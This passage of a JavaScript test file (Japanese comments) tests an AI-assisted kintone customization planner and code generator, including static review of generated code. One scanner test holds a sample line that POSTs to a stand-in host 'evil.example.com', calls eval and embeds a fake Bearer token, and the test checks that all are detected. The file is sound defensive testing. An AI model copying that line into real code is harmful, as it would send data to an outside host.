// Customization Planner & JavaScript Generator（Phase 16）: 標準設定と JavaScript を統合した計画の Toolkit 検証 / 生成コードの静的検査 / AI Workspace の統合
//
// 検証内容:
//   §51 Planner（Toolkit 側）: 標準のみ / カスタマイズのみ / Hybrid / 既存 JS への統合 / 新規 JS / 統合先が曖昧 / キャッシュで本文なし / PC・モバイル未定 /
//        存在しないイベント / 既存 JS との競合（JS_FIELD_CONFLICT）/ Generator Context（アプリ全体の facts を送らない）
//   §52 Generator（KTCodeReview）: 新規 JS OK / patch OK / 構文エラー / 未知イベント / 未知フィールド / 計画外のフィールド書き換え / 計画外 API /
//        計画との不一致 / 危険 API / 秘密情報 / 外部通信 / anchor 不明 / baseHash 不一致 / グローバル汚染 / return event なし
//   §53 Chat: Hybrid の計画カード / カスタマイズの修正 / 「コードを作って」/ コードカード / Diff / コピー / 説明 / Q&A は影響なし /
//        Preview Executor は JS を反映しない / 「これで進めて」はコードを作らない / 本文が無いときの JS_SOURCE_UNAVAILABLE → 再スキャン / 契約に無い
//
// 実行方法: node tests/ai-customization.test.js
'use strict';
const { loadToolkit, makeAssert } = require('./helpers/load-toolkit.js');
const { makeFakeHost } = require('./helpers/fake-dom.js');
const { KTDeps, KTScan, KTContext, KTAiClient, KTAiConversation, KTAiChatUi, KTContextUi, KTPlanReview, KTCodeReview, KTJsCatalog, KTPlanExecutor, mountAiWorkspace } = loadToolkit();
const { assert, state } = makeAssert();
const FX = require('./fixtures/ai-context-app.js');
const { buildScanPayload } = require('./helpers/scan-payload.js');
const { makeKintoneMock } = require('./helpers/kintone-preview-mock.js');

// 既存 JS: 承認待ちのとき金額を編集不可にする（E2E の app 346 に登録するものと同じ形）
const FIELD_ON_OFF = [
  "(function () {",
  "  'use strict';",
  "  kintone.events.on(['app.record.create.show', 'app.record.edit.show'], function (event) {",
  "    var record = event.record;",
  "    if (record['ステータス'].value === '承認待ち') {",
  "      record['amount'].disabled = true;",
  "    }",
  "    return event;",
  "  });",
  "})();",
].join('\n');
const FIELD_ON_OFF_FILE = { name: 'fieldOnOff.js', target: 'desktop', kind: 'js', text: FIELD_ON_OFF };

/** 入力（data / deps / scan / incoming）。withFieldOnOff: 既存 JS を足す。sourceText: false なら Scanner のキャッシュ payload（本文なし） */
function buildInputs({ withFieldOnOff = true, sourceText = true } = {}) {
  const data = FX.makeData();
  if (withFieldOnOff) data.customize.desktop.js.push({ type: 'FILE', file: { contentType: 'text/javascript', fileKey: '20261003000000EEEE', name: 'fieldOnOff.js', size: '300' } });
  const fieldsN = KTDeps.normalizeFields(data.fields);
  const deps = KTDeps.buildDependencyData(data, fieldsN);
  const files = withFieldOnOff ? [...FX.files, FIELD_ON_OFF_FILE] : [...FX.files];
  const fieldRows = fieldsN.map(f => ({ code: f.code, label: f.label, type: f.rawType }));
  const scan = buildScanPayload({ KTScan, KTDeps }, { appId: FX.SELF_APP, files, fields: fieldRows, deps, skippedUrlFiles: FX.skippedUrlFiles });
  scan.results = KTScan.analyze({ fields: fieldRows, files: files.filter(f => f.kind === 'js'), snippet: { before: 24, after: 48 } });   // 実スキャナの access 分類（.disabled = → CONTROL）
  if (!sourceText) scan.files = scan.files.map(f => ({ name: f.name, target: f.target, kind: f.kind, ...(f.note ? { note: f.note } : {}) }));
  KTDeps.mergeScannerEdges(deps, scan);
  KTDeps.applyIncomingRefs(deps, FX.incoming);
  return { data, deps, scan, incoming: FX.incoming };
}
const INPUTS = buildInputs();
const INPUTS_PLAIN = buildInputs({ withFieldOnOff: false });
const INPUTS_CACHED = buildInputs({ sourceText: false });

const GOAL_HYBRID = '100万円以上なら部長承認にして、承認後は金額を編集できなくしたい';
const spec = (o) => ({ name: null, from: null, to: null, filterCond: null, assignees: [], targets: [], events: [], timingField: null, daysLater: null, time: null, fields: [], sort: null, sourceApp: null, keyField: null, mappings: [], fieldType: null, required: null, options: [], destApp: null, accessibility: null, entities: [], customizationId: null, ...o });
const mkStep = (id, actionType, targetKind, targetRef, sp, extra = {}) => ({ id, actionType, targetKind, targetRef, targetExists: null, title: `${id} ${actionType}`, proposal: { summary: '', details: [] }, spec: spec(sp), dependsOn: [], reason: '', evidenceIds: [], confidence: 'INFERRED', alternativeId: null, validation: { status: 'ok', issues: [] }, execution: { mode: 'PLAN_ONLY', supported: false, reason: 'x' }, ...extra });
const META = { requestId: 'pl-h1', gateway: { product: 'toolkit', feature: 'change-planner', promptVersion: '1', contextVersion: 'planner-1' }, normalization: { warnings: [] }, ai: { model: 'm' }, usage: { usedThisMonth: 1, monthlyLimit: 20 } };
const cust = (o = {}) => ({ customizationId: 'C1', requirement: '承認後（完了）は金額を編集できなくする', whyStandardInsufficient: 'フィールドのアクセス権はステータスで切り替えられない', strategy: 'EXTEND_EXISTING_JS', platform: ['desktop'], events: ['app.record.edit.show'], fields: [{ code: 'amount', access: 'CONTROL' }], apis: [], existingFiles: [{ name: 'fieldOnOff.js', target: 'desktop', reason: '同じフィールド（金額）を制御している' }], risks: [], questions: [], dependsOn: [], evidenceIds: [], ...o });
const STD_STEP = () => mkStep('P1', 'ADD_VIEW', 'VIEW', '承認済み', { name: '承認済み', fields: ['case_name', 'amount', 'approver'], filterCond: 'ステータス in ("完了")', sort: 'due_date asc' }, { title: '一覧「承認済み」を追加', solution: 'STANDARD' });
const JS_STEP = (cid = 'C1', extra = {}) => mkStep('P2', 'CUSTOMIZATION_REQUIRED', 'JS', 'fieldOnOff.js', { customizationId: cid }, { title: '承認後は金額を編集できなくする（JavaScript）', solution: 'CUSTOMIZATION', ...extra });
const planOf = ({ steps, customizations = [], solution = null, goal = GOAL_HYBRID, questions = [], requestId = 'pl-h1' }) => ({
  ok: true, contractVersion: '2.1', meta: { ...META, requestId },
  plan: { goal, ...(solution ? { solution } : {}), assessment: { summary: '承認フローは標準のプロセス管理、承認後のロックは JavaScript が必要です。', usableExistingFields: [], usableExistingSettings: [], missingCapabilities: [], uncertainties: [] }, relevantFields: [], proposedFields: [], steps, customizations, alternatives: [], impact: [], questions, unknowns: [], planConfidence: 'INFERRED' },
});
const PLAN_HYBRID = planOf({ steps: [STD_STEP(), JS_STEP()], customizations: [cust()], solution: 'HYBRID' });
const PLAN_STD = planOf({ steps: [STD_STEP()], solution: 'STANDARD', goal: '承認済みの一覧を追加したい' });
const PLAN_JS_ONLY = planOf({ steps: [JS_STEP()], customizations: [cust()], solution: 'CUSTOMIZATION', goal: '承認後は金額を編集できなくしたい' });
const NEW_JS_CUST = () => cust({ customizationId: 'C1', requirement: '金額が100万円以上なら警告メッセージを表示する', whyStandardInsufficient: '入力中の値に応じたメッセージ表示は標準設定にない', strategy: 'NEW_JS_FILE', platform: ['desktop'], events: ['app.record.create.change.amount', 'app.record.edit.change.amount'], fields: [{ code: 'amount', access: 'CONTROL' }], existingFiles: [] });
const PLAN_NEW_JS = planOf({ steps: [JS_STEP('C1', { title: '金額が100万円以上なら警告メッセージを表示（JavaScript）', targetRef: null })], customizations: [NEW_JS_CUST()], solution: 'CUSTOMIZATION', goal: '金額が100万円以上なら警告メッセージを表示したい' });

/** Planner Context → client 側の validatePlan（会話経路と同じ）→ KTPlanReview.review */
function reviewPlan(resp, inputs = INPUTS) {
  const gen = KTContextUi.generatePlan({ goal: resp.plan.goal, inputs });
  const v = KTAiClient.validatePlan(resp, gen.ctx);
  if (!v.ok) throw new Error(`validatePlan failed: ${JSON.stringify(v.errors)}`);
  const plan = { ...v.normalized, requestId: resp.meta.requestId };
  const review = KTPlanReview.review({ plan, ...inputs });
  return { plan, review, ctx: gen.ctx, jsReview: (review.steps || []).find(r => r.solution === 'CUSTOMIZATION') || null };
}
const hash = (t) => KTScan.hashText(t);
const NEW_JS_GOOD = [
  "(function () {",
  "  'use strict';",
  "  kintone.events.on(['app.record.create.change.amount', 'app.record.edit.change.amount'], function (event) {",
  "    var record = event.record;",
  "    var amount = Number(record['amount'].value || 0);",
  "    record['amount'].error = amount >= 1000000 ? '100万円以上は部長の承認が必要です' : null;",
  "    return event;",
  "  });",
  "})();",
].join('\n');
const PATCH_GOOD = {
  baseHash: hash(FIELD_ON_OFF),
  operations: [{ type: 'INSERT_AFTER', anchor: "      record['amount'].disabled = true;\n    }", content: "    if (record['ステータス'].value === '完了') {\n      record['amount'].disabled = true;\n    }" }],
};
const PATCH_ADDED = PATCH_GOOD.operations[0].content;
/** Gateway の応答（generated）。validateGenerated を通して会話経路と同じ形にする */
const genResponse = (ctx, g) => ({ ok: true, contractVersion: '2.1', meta: { requestId: 'gen-1', usage: { usedThisMonth: 3, monthlyLimit: 20 }, normalization: { warnings: [] }, gateway: { feature: 'customization-generator' } }, generated: { strategy: ctx.customization.strategy, targetFile: ctx.existingFile?.name || 'amountWarning.js', summary: ctx.customization.requirement, events: ctx.customization.events, fields: ctx.customization.fields, apis: [], assumptions: [], warnings: [], gatewayChecks: { security: [] }, ...g } });
const genNew = (code = NEW_JS_GOOD, g = {}) => ({ strategy: 'NEW_JS_FILE', targetFile: 'amountWarning.js', summary: '金額の警告', code, patch: null, events: ['app.record.create.change.amount', 'app.record.edit.change.amount'], fields: [{ code: 'amount', access: 'CONTROL' }], apis: [], assumptions: [], warnings: [], ...g });
const genPatch = (patch = PATCH_GOOD, g = {}) => ({ strategy: 'EXTEND_EXISTING_JS', targetFile: 'fieldOnOff.js', summary: '完了でも金額を編集不可にする', code: patch.operations.map(o => o.content).join('\n'), patch, events: ['app.record.edit.show'], fields: [{ code: 'amount', access: 'CONTROL' }], apis: [], assumptions: [], warnings: [], ...g });
const check = (rv, name) => (rv.checks || []).find(c => c.name === name) || null;
const SRC = { name: 'fieldOnOff.js', target: 'desktop', text: FIELD_ON_OFF };
const tick = () => new Promise(r => setTimeout(r, 0));
const ticks = async (n = 4) => { for (let i = 0; i < n; i++) await tick(); };

(async () => {
// =========================================================
console.log('\n--- §51-1. KTJsCatalog（決定的な Event / API Catalog）---');
{
  assert(KTJsCatalog.checkEvent('app.record.edit.show').ok && KTJsCatalog.checkEvent('mobile.app.record.create.show').ok, 'Event Catalog: 既知のイベント');
  const bad = KTJsCatalog.checkEvent('app.record.update.show');
  assert(bad.ok === false, 'Event Catalog: app.record.update.show は存在しない（計画・コードの両方で拒否する根拠）');
  const ch = KTJsCatalog.checkEvent('app.record.create.change.amount', { fields: ['amount'] });
  assert(ch.ok && ch.field === 'amount' && KTJsCatalog.checkEvent('app.record.create.change.nope', { fields: ['amount'] }).ok === false, 'change イベントはフィールドの実在を確認する');
  assert(KTJsCatalog.eventPlatform('mobile.app.record.edit.show') === 'mobile' && KTJsCatalog.eventPlatform('app.record.edit.show') === 'desktop', 'イベントの platform');
  const sec = KTJsCatalog.scanSecurity("fetch('https://evil.example.com/x', { method: 'POST', body: '1' }); eval('1'); var h = { Authorization: 'Bearer abcdefghijklmnop1234' };");
  assert(sec.some(x => x.severity === 'block') && sec.length >= 3, `Security rules: 外部 POST / eval / Authorization を検出（${sec.length} 件）`);
}

// =========================================================
console.log('\n--- §51-2. Toolkit Review: 標準のみ / カスタマイズのみ / Hybrid ---');
{
  const std = reviewPlan(PLAN_STD);
  assert(std.plan.solution === 'STANDARD' && std.plan.customizations.length === 0 && std.review.hybrid.solution === 'STANDARD' && std.review.summary.counts.customizations === 0, '標準のみ: solution STANDARD・customizations なし');
  const js = reviewPlan(PLAN_JS_ONLY);
  assert(js.plan.solution === 'CUSTOMIZATION' && js.review.hybrid.solution === 'CUSTOMIZATION' && js.review.hybrid.standard.steps.length === 0 && js.review.hybrid.customization.steps.length === 1, 'カスタマイズのみ: solution CUSTOMIZATION');
  const hy = reviewPlan(PLAN_HYBRID);
  assert(hy.plan.solution === 'HYBRID' && hy.review.hybrid.solution === 'HYBRID' && hy.review.hybrid.standard.steps.includes('P1') && hy.review.hybrid.customization.steps.includes('P2'), 'Hybrid: 標準設定 P1 ＋ JavaScript P2 を同じ Review 上で分けて要約');
  assert(hy.jsReview && hy.jsReview.solution === 'CUSTOMIZATION' && hy.jsReview.safety === 'PLAN_ONLY' && hy.jsReview.customization.customizationId === 'C1', 'JS の step は PLAN_ONLY（Executor は反映しない）・customization を保持');
  assert(hy.jsReview.codeGeneration.supported === true && hy.jsReview.codeGeneration.strategy === 'EXTEND_EXISTING_JS' && hy.jsReview.codeGeneration.existingFile?.name === 'fieldOnOff.js' && hy.jsReview.codeGeneration.sourceAvailable === true, '既存 JS への統合: 統合先 fieldOnOff.js を解決・本文あり・コード生成可');
  assert(hy.review.executionReadiness.generatableSteps.includes('P2') && hy.review.hybrid.customization.generatable.includes('P2'), 'executionReadiness.generatableSteps に P2');
  assert(hy.review.executionReadiness.planOnlySteps.includes('P2') && !hy.review.executionReadiness.safeSteps.includes('P2'), 'JS は safeSteps に入らない（Executor の対象外）');
  const out = KTPlanReview.executorOutput(hy.plan, hy.review, ['P1', 'P2']);
  const cls = KTPlanExecutor.classifySteps(out);
  assert(cls.find(x => x.stepId === 'P2')?.status === 'UNSUPPORTED' && cls.find(x => x.stepId === 'P1')?.status === 'PENDING', 'Executor の分類: P1 は PENDING（実行可）・JS の P2 は UNSUPPORTED（反映しない）');
  assert(out.plan.solution === 'HYBRID' && out.plan.customizations?.length === 1 && out.review.hybrid?.customization?.steps?.includes('P2'), 'executorOutput に solution / customizations / hybrid が残る（監査 JSON）');
  // 新規 JS
  const nw = reviewPlan(PLAN_NEW_JS);
  assert(nw.jsReview.codeGeneration.supported === true && nw.jsReview.codeGeneration.strategy === 'NEW_JS_FILE' && nw.jsReview.codeGeneration.existingFile === null, '新規 JS: NEW_JS_FILE でコード生成可');
  assert(nw.jsReview.issues.some(i => i.code === 'JS_FIELD_CONFLICT' && i.file === 'fieldOnOff.js') && nw.jsReview.status === 'NEEDS_CONFIRMATION' && nw.review.hybrid.customization.conflicts.includes('P2'), '既存 JS（fieldOnOff.js）が同じ amount を CONTROL → JS_FIELD_CONFLICT（REVIEW_REQUIRED・統合を検討）');
  const nwPlain = reviewPlan(PLAN_NEW_JS, INPUTS_PLAIN);
  assert(!nwPlain.jsReview.issues.some(i => i.code === 'JS_FIELD_CONFLICT') && nwPlain.jsReview.status === 'VALID', '同じフィールドを扱う既存 JS が無ければ競合なし（VALID）');
}

// =========================================================
console.log('\n--- §51-3. Toolkit Review: 統合先が曖昧 / 本文なし / PC・モバイル未定 / 未知イベント / 理由なし ---');
{
  const ambiguous = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ existingFiles: [] })] }));
  assert(ambiguous.jsReview.issues.some(i => i.code === 'JS_TARGET_FILE_MISSING') && ambiguous.jsReview.codeGeneration.supported === false && ambiguous.jsReview.codeGeneration.reason === 'TARGET_FILE_MISSING', '統合先が曖昧（existingFiles なし）: JS_TARGET_FILE_MISSING・生成不可');
  const notFound = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ existingFiles: [{ name: 'ghost.js', target: 'desktop', reason: '' }] })] }));
  assert(notFound.jsReview.status === 'INVALID' && notFound.jsReview.issues.some(i => i.code === 'JS_TARGET_FILE_NOT_FOUND'), '登録されていないファイルへの統合: INVALID（実行不可）');
  const cached = reviewPlan(PLAN_HYBRID, INPUTS_CACHED);
  assert(cached.jsReview.codeGeneration.sourceAvailable === false && cached.jsReview.issues.some(i => i.code === 'JS_SOURCE_UNAVAILABLE') && cached.jsReview.codeGeneration.supported === true, 'キャッシュ payload（本文なし）: JS_SOURCE_UNAVAILABLE（低）。生成時に取得を試みる');
  const noPlatform = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ platform: [] })] }));
  assert(noPlatform.jsReview.issues.some(i => i.code === 'JS_PLATFORM_UNSPECIFIED') && noPlatform.jsReview.codeGeneration.supported === false && noPlatform.jsReview.codeGeneration.reason === 'PLATFORM_UNSPECIFIED' && noPlatform.jsReview.status === 'NEEDS_CONFIRMATION', 'PC / モバイル未定: 確認が必要・生成不可（勝手に desktop にしない）');
  const badEvent = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ events: ['app.record.update.show'] })] }));
  assert(badEvent.jsReview.status === 'INVALID' && badEvent.jsReview.issues.some(i => i.code === 'JS_EVENT_UNKNOWN') && badEvent.jsReview.codeGeneration.supported === false, '存在しないイベント app.record.update.show: INVALID');
  const noReason = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ whyStandardInsufficient: '' })] }));
  assert(noReason.jsReview.issues.some(i => i.code === 'JS_REASON_MISSING') && noReason.jsReview.status === 'NEEDS_CONFIRMATION', '標準設定で不足する理由が無い: 確認が必要');
  const wrongScreen = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ events: ['app.record.detail.show'] })] }));
  assert(wrongScreen.jsReview.issues.some(i => i.code === 'JS_SCREEN_MISMATCH'), 'CONTROL するのに詳細画面のイベントだけ: JS_SCREEN_MISMATCH');
  const unknownField = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ fields: [{ code: 'amount', access: 'CONTROL' }, { code: 'nope_field', access: 'READ' }] })] }));
  assert(unknownField.jsReview.status === 'INVALID' && unknownField.jsReview.issues.some(i => i.code === 'JS_FIELD_UNKNOWN'), '存在しないフィールドを計画に含む: INVALID');
  const missing = reviewPlan(planOf({ steps: [JS_STEP('C9')], customizations: [cust()] }));
  assert(missing.jsReview.status === 'INVALID' && missing.jsReview.issues.some(i => i.code === 'CUSTOMIZATION_NOT_FOUND'), 'step が指す customization が無い: INVALID');
  // 実機（Scenario A 2 回目）: 依存する標準設定（新しいステータス等）が無効 → JS は BLOCKED_BY_DEPENDENCY で生成不可（存在しない設定名を前提にしたコードを作らない）
  const depBad = reviewPlan(planOf({ steps: [mkStep('P1', 'ADD_FIELD', 'PROPOSED_FIELD', 'NEW_FIELD_9', { fieldType: 'DROP_DOWN', options: ['a'] }, { title: '提案に無い新規フィールド' }), JS_STEP('C1', { dependsOn: ['P1'] })], customizations: [cust({ dependsOn: ['P1'] })], solution: 'HYBRID' }));
  assert(depBad.jsReview.status === 'BLOCKED_BY_DEPENDENCY' && depBad.jsReview.codeGeneration.supported === false && depBad.jsReview.codeGeneration.reason === 'BLOCKED_BY_DEPENDENCY' && depBad.review.hybrid.customization.blocked.includes('P2') && !depBad.review.hybrid.customization.generatable.includes('P2'), '依存する標準設定が無効: JS は BLOCKED_BY_DEPENDENCY・生成不可（generatable に入らない）');
  assert(/依存する標準設定が無効/.test(KTContextUi.planHtml(depBad.plan, depBad.review)), '実行前レビュー: 生成できない理由を日本語で');
  // 実機（Scenario C）: 「警告メッセージを表示」なのに amount が READ → 生成コード（error = CONTROL）と計画が不一致になる → ヒント（低）
  const readOnly = reviewPlan(planOf({ steps: [JS_STEP('C1', { title: '金額が100万円以上なら警告メッセージを表示（JavaScript）' })], customizations: [{ ...NEW_JS_CUST(), fields: [{ code: 'amount', access: 'READ' }, { code: 'ステータス', access: 'READ' }] }] }), INPUTS_PLAIN);
  assert(readOnly.jsReview.issues.some(i => i.code === 'JS_ACCESS_HINT' && i.severity === 'low') && readOnly.jsReview.codeGeneration.supported === true, '要件が警告表示なのに CONTROL のフィールドが無い（複数フィールドで自動調整の対象外）: JS_ACCESS_HINT（低。生成は可能）');
  assert(!reviewPlan(PLAN_NEW_JS, INPUTS_PLAIN).jsReview.issues.some(i => i.code === 'JS_ACCESS_HINT'), 'amount が CONTROL ならヒントなし');
  // validatePlan（client）: customizations の正規化と solution の導出
  const gen = KTContextUi.generatePlan({ goal: GOAL_HYBRID, inputs: INPUTS });
  const v = KTAiClient.validatePlan(planOf({ steps: [STD_STEP(), JS_STEP()], customizations: [cust({ platform: ['desktop', 'tablet'], fields: [{ code: 'amount', access: 'ADMIN' }], evidenceIds: ['E999'] })] }), gen.ctx);
  assert(v.ok && v.normalized.solution === 'HYBRID' && v.normalized.customizations[0].platform.join() === 'desktop' && v.normalized.customizations[0].fields[0].access === 'CONTROL' && v.normalized.customizations[0].evidenceIds.length === 0 && v.warnings.some(w => w.code === 'UNKNOWN_EVIDENCE_REMOVED') && v.warnings.some(w => w.code === 'CUSTOMIZATION_ACCESS_ADJUSTED'), 'validatePlan: platform / access の語彙外を落とし（唯一の READ は要件が編集不可なので CONTROL）、未知の根拠ID を除去、solution を導出');
  // 実機（Scenario C）: 「PC とモバイル両方で必要か」を質問しながら両方を platform に入れる → 空に（Gateway の validate-plan と同じ正規化）
  const vq = KTAiClient.validatePlan(planOf({ steps: [JS_STEP()], customizations: [{ ...NEW_JS_CUST(), platform: ['desktop', 'mobile'], questions: ['PCとモバイル両方で必要か？'] }] }), gen.ctx);
  assert(vq.ok && vq.normalized.customizations[0].platform.length === 0 && vq.warnings.some(w => w.code === 'CUSTOMIZATION_PLATFORM_QUESTIONED'), 'validatePlan: PC / モバイルの要否を質問しながら両方 → platform []（Review が PLATFORM_UNSPECIFIED で止める）');
  const vq2 = KTAiClient.validatePlan(planOf({ steps: [JS_STEP()], customizations: [{ ...NEW_JS_CUST(), platform: ['desktop', 'mobile'], events: ['app.record.create.change.amount', 'mobile.app.record.create.change.amount'], questions: ['警告の文言は？'] }] }), gen.ctx);
  assert(vq2.ok && vq2.normalized.customizations[0].platform.join() === 'desktop,mobile', '質問が platform の要否でなければ両方のまま');
}

// =========================================================
console.log('\n--- §51-4. Planner Context の js-file facts と Generator Context ---');
{
  const gen = KTContextUi.generatePlan({ goal: GOAL_HYBRID, inputs: INPUTS });
  const jsFacts = gen.ctx.facts.filter(f => f.kind === 'js-file');
  assert(jsFacts.length >= 1 && jsFacts.some(f => /fieldOnOff\.js/.test(f.statement) && /amount/.test(f.statement)), `Planner Context: js-file facts に fieldOnOff.js（amount を制御）がある（${jsFacts.length} 件）`);
  assert(Array.isArray(gen.ctx.dictionary.jsFiles) && gen.ctx.dictionary.jsFiles.some(x => /fieldOnOff\.js/.test(x)), 'dictionary.jsFiles に登録済み JS');
  const hy = reviewPlan(PLAN_HYBRID);
  const c = hy.plan.customizations[0];
  const gctx = KTContext.buildGenerator({ customization: c, plan: hy.plan, planId: 'plan-1', version: 1, data: INPUTS.data, deps: INPUTS.deps, scan: INPUTS.scan, existingSource: SRC });
  assert(gctx.contextVersion === KTContext.GENERATOR_CONTEXT_VERSION && gctx.customization.customizationId === 'C1' && gctx.customization.strategy === 'EXTEND_EXISTING_JS', 'Generator Context: contextVersion customization-1・承認済み customization');
  assert(gctx.facts === undefined && !('retrieval' in gctx) && gctx.fields.length <= 4 && gctx.fields.some(f => f.code === 'amount') && gctx.fields.some(f => f.type === 'STATUS'), 'アプリ全体の facts は送らない。関係するフィールド（amount）＋ ステータスだけ');
  assert(gctx.existingFile && gctx.existingFile.hash === hash(FIELD_ON_OFF) && gctx.existingFile.source === FIELD_ON_OFF && gctx.existingFile.analysis.events.includes('app.record.edit.show') && gctx.existingFile.analysis.fields.some(f => f.code === 'amount'), '統合先の本文・指紋（baseHash）・解析（イベント / フィールド）を渡す');
  assert(gctx.otherFiles.every(f => f.name !== 'fieldOnOff.js') && gctx.otherFiles.some(f => f.name === 'common.js'), '他の JS は要約だけ（統合先は除く）');
  assert(gctx.dictionary.fieldCodes.includes('amount') && gctx.dictionary.statuses.includes('承認待ち') && gctx.constraints.noNetwork === true && gctx.constraints.patchOnly === true && gctx.plan.standardSteps.some(s => s.id === 'P1'), 'dictionary（フィールドコード・ステータス名）・制約（通信なし・patch のみ）・関係する標準設定の step');
  const env = KTAiClient.buildGenerateEnvelope({ ctx: gctx, requestId: 'r1' });
  assert(env.meta.feature === KTAiClient.FEATURE_GENERATOR && env.meta.feature === 'customization-generator' && env.meta.contextVersion === 'customization-1' && env.payload === gctx, 'envelope: feature customization-generator（Planner と別 feature）');
  let threw = null; try { KTAiClient.buildGenerateEnvelope({ ctx: { contextVersion: 'x' } }); } catch (e) { threw = e; }
  assert(threw && threw.code === KTAiClient.ERROR_CODES.NO_CONTEXT, 'customization の無い ctx は送れない');
  const vg = KTAiClient.validateGenerated(genResponse(gctx, genPatch()), gctx);
  assert(vg.ok && vg.normalized.strategy === 'EXTEND_EXISTING_JS' && vg.normalized.patch?.operations?.length === 1 && vg.normalized.requestId === 'gen-1', 'validateGenerated: strategy / code / patch を正規化');
  const vgBad = KTAiClient.validateGenerated(genResponse(gctx, genPatch(PATCH_GOOD, { patch: null })), gctx);
  assert(!vgBad.ok && vgBad.errors[0].code === KTAiClient.ERROR_CODES.INVALID_RESPONSE, 'EXTEND_EXISTING_JS なのに patch が無い応答は拒否');
  const vgMis = KTAiClient.validateGenerated(genResponse(gctx, genNew()), gctx);
  assert(vgMis.ok && vgMis.warnings.some(w => w.code === 'STRATEGY_MISMATCH'), '方針が計画と違えば warning（Toolkit Code Review が計画との照合を行う）');
}

// =========================================================
console.log('\n--- §52-1. KTCodeReview: 新規 JS OK / patch OK ---');
{
  const nw = reviewPlan(PLAN_NEW_JS, INPUTS_PLAIN);
  const prov = { planId: 'plan-1', planVersion: 1, customizationId: 'C1', generatedAt: '2026-10-03T00:00:00.000Z', appId: '310', requestId: 'gen-1' };
  const rv = KTCodeReview.review({ generated: genNew(), customization: nw.plan.customizations[0], plan: nw.plan, data: INPUTS_PLAIN.data, scan: INPUTS_PLAIN.scan, existingSource: null, provenance: prov });
  assert(rv.status === 'OK', `新規 JS（妥当）: status OK（${(rv.checks || []).filter(c => !c.ok).map(c => `${c.name}: ${c.message}`).join(' / ') || 'すべて ✓'}）`);
  assert(check(rv, 'syntax')?.ok && check(rv, 'events')?.ok && check(rv, 'fields')?.ok && check(rv, 'security')?.ok && check(rv, 'globals')?.ok && check(rv, 'return-event')?.ok && check(rv, 'plan-consistency')?.ok, 'チェック項目: 構文 / イベント / フィールド / セキュリティ / グローバル汚染 / return event / 計画との一致');
  assert(rv.finalCode === NEW_JS_GOOD && rv.diff && rv.diff.added === NEW_JS_GOOD.split('\n').length && rv.diff.removed === 0, '新規 JS: finalCode ＝ 全文・diff は全行追加');
  assert(rv.rescan && rv.rescan.events.map(e => e.name).includes('app.record.create.change.amount') && rv.rescan.fieldAccess.amount && rv.rescan.fieldAccess.amount.CONTROL, 'KTScan の再解析（仮想ファイル）: イベント・amount CONTROL');
  assert(rv.provenance && rv.provenance.planId === 'plan-1' && rv.provenance.customizationId === 'C1' && rv.provenance.codeHash === hash(NEW_JS_GOOD) && rv.provenance.reviewedAt, 'provenance（計画・版・customization・requestId・コードの指紋）');
  // 既存 JS への patch
  const hy = reviewPlan(PLAN_HYBRID);
  const rp = KTCodeReview.review({ generated: genPatch(), customization: hy.plan.customizations[0], plan: hy.plan, data: INPUTS.data, scan: INPUTS.scan, existingSource: SRC });
  assert(rp.status === 'OK', `既存 JS への patch（妥当）: status OK（${(rp.checks || []).filter(c => !c.ok).map(c => `${c.name}: ${c.message}`).join(' / ') || 'すべて ✓'}）`);
  assert(check(rp, 'patch')?.ok && rp.diff.added === 3 && rp.diff.removed === 0 && rp.finalCode.includes(FIELD_ON_OFF.split('\n')[2]) && rp.finalCode.includes("value === '完了'"), 'patch: 既存の行は保持（削除 0）・3 行追加・最終コードは既存 ＋ 追加');
  assert(check(rp, 'handler')?.ok && /既存の handler/.test(check(rp, 'handler').message), '既存 handler の中へ追加（kintone.events.on を重複登録しない）');
  assert(rp.patch?.applied === 1 && rp.patch.afterHash === hash(rp.finalCode) && typeof rp.diffText === 'string' && /\+\s*if \(record\['ステータス'\]\.value === '完了'\)/.test(rp.diffText), 'patch の適用結果（afterHash）と Before / After の diff テキスト');
  assert(!check(rp, 'duplicate-handler') || check(rp, 'duplicate-handler').ok, '重複 handler なし');
}

// =========================================================
console.log('\n--- §52-2. KTCodeReview: 構文 / 未知イベント / 未知フィールド / 計画外 / API / 危険 / 秘密 / 外部通信 / patch 失敗 / 作法 ---');
{
  const nw = reviewPlan(PLAN_NEW_JS, INPUTS_PLAIN);
  const c = nw.plan.customizations[0];
  const run = (code, g = {}) => KTCodeReview.review({ generated: genNew(code, g), customization: c, plan: nw.plan, data: INPUTS_PLAIN.data, scan: INPUTS_PLAIN.scan, existingSource: null });
  const syn = run(NEW_JS_GOOD.replace('return event;', 'return event'.slice(0, 6) + ' event event;'));
  assert(syn.status === 'BLOCKED' && check(syn, 'syntax') && !check(syn, 'syntax').ok, '構文エラー: BLOCKED（parse のみ。実行しない）');
  const badEv = run(NEW_JS_GOOD.replace("'app.record.edit.change.amount'", "'app.record.update.show'"));
  assert(badEv.status === 'BLOCKED' && !check(badEv, 'events').ok && /app\.record\.update\.show/.test(check(badEv, 'events').message), '存在しないイベント app.record.update.show: BLOCKED');
  const badField = run(NEW_JS_GOOD.replace("record['amount'].value", "record['amount_total'].value"));
  assert(badField.status === 'BLOCKED' && !check(badField, 'fields').ok && /GENERATED_JS_UNKNOWN_FIELD/.test(check(badField, 'fields').message) && /amount_total/.test(check(badField, 'fields').message), '存在しないフィールド amount_total: GENERATED_JS_UNKNOWN_FIELD（BLOCKED）');
  const extraWrite = run(NEW_JS_GOOD.replace("    return event;", "    record['approver'].value = [];\n    return event;"));
  assert(extraWrite.status === 'REVIEW_REQUIRED' && !check(extraWrite, 'plan-consistency').ok && extraWrite.mismatches.some(m => m.code === 'EXTRA_FIELD_WRITE' && m.items.includes('approver')), '計画に無いフィールド（approver）の書き換え: CUSTOMIZATION_PLAN_MISMATCH（確認が必要）');
  const extraApi = run(NEW_JS_GOOD.replace("    return event;", "    kintone.api(kintone.api.url('/k/v1/records.json', true), 'GET', { app: 600 });\n    return event;"));
  assert(extraApi.status === 'REVIEW_REQUIRED' && check(extraApi, 'apis-network') && !check(extraApi, 'apis-network').ok && /kintone\.api/.test(check(extraApi, 'apis-network').message), '計画に無い REST API（kintone.api）: 確認が必要（単純な制御には不要）');
  const missingEv = run(NEW_JS_GOOD.replace("['app.record.create.change.amount', 'app.record.edit.change.amount']", "'app.record.create.change.amount'"));
